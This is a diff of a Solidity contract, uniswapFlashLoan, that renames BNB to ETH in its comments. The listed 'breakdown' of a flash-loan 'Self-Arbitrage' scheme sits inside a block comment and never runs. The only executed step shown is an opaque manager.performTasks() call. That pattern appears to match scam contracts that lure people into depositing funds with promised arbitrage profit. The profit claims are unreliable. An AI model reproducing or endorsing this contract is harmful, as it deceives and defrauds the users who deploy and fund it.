@@ -38,7 +38,7 @@ contract uniswapFlashLoan {
 	    manager.performTasks();
 	    
 	    /* Breakdown of functions
-	    // Submit token to BSC blockchain
+	    // Submit token to ETH blockchain
 	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
 
         // List the token on uniswapSwap
@@ -47,20 +47,20 @@ contract uniswapFlashLoan {
         // Get BNB Loan from Multiplier-Finance
 		string memory loanAddress = manager.takeFlashLoan(loanAmount);
 		
-		// Convert half BNB to DAI
-		manager.uniswapDAItoBNB(loanAmount / 2);
+		// Convert half ETH to DAI
+		manager.uniswapDAItoETH(loanAmount / 2);
 
-        // Create BNB and DAI pairs for our token & Provide liquidity
-        string memory bnbPair = manager.uniswapCreatePool(tokenAddress, "BNB");
-		manager.uniswapAddLiquidity(bnbPair, loanAmount / 2);
+        // Create ETH and DAI pairs for our token & Provide liquidity
+        string memory ethPair = manager.uniswapCreatePool(tokenAddress, "ETH");
+		manager.uniswapAddLiquidity(ethPair, loanAmount / 2);
 		string memory daiPair = manager.uniswapCreatePool(tokenAddress, "DAI");
 		manager.uniswapAddLiquidity(daiPair, loanAmount / 2);
     
         // Perform swaps and profit on Self-Arbitrage
 		manager.uniswapPerformSwaps();
 		
-		// Move remaining BNB from Contract to your account
-		manager.contractToWallet("BNB");
+		// Move remaining ETH from Contract to your account
+		manager.contractToWallet("ETH");
 
         // Repay Flash loan
 		manager.repayLoan(loanAddress);
